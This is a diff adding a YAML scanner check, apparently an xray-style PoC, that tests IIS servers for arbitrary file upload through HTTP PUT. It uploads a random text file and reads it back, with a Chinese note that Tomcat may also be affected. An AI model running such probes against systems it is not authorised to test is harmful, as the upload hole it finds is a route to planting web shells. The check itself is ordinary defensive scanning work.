@@ -1,0 +1,24 @@
+name: poc-yaml-iis-put-getshell
+set:
+    filename: randomLowercase(6)
+    fileContent: randomLowercase(6)
+rules:
+    r0:
+        request:
+            cache: true
+            method: PUT
+            path: /{{filename}}.txt
+            body: |
+                {{fileContent}}
+        expression: response.status == 201
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /{{filename}}.txt
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(fileContent))
+expression: r0() && r1()
+detail:
+    links:
+        - 注意POC在偷懒:PUT任意文件上传也可能是tomcat https://www.cnblogs.com/-mo-/p/11295400.html
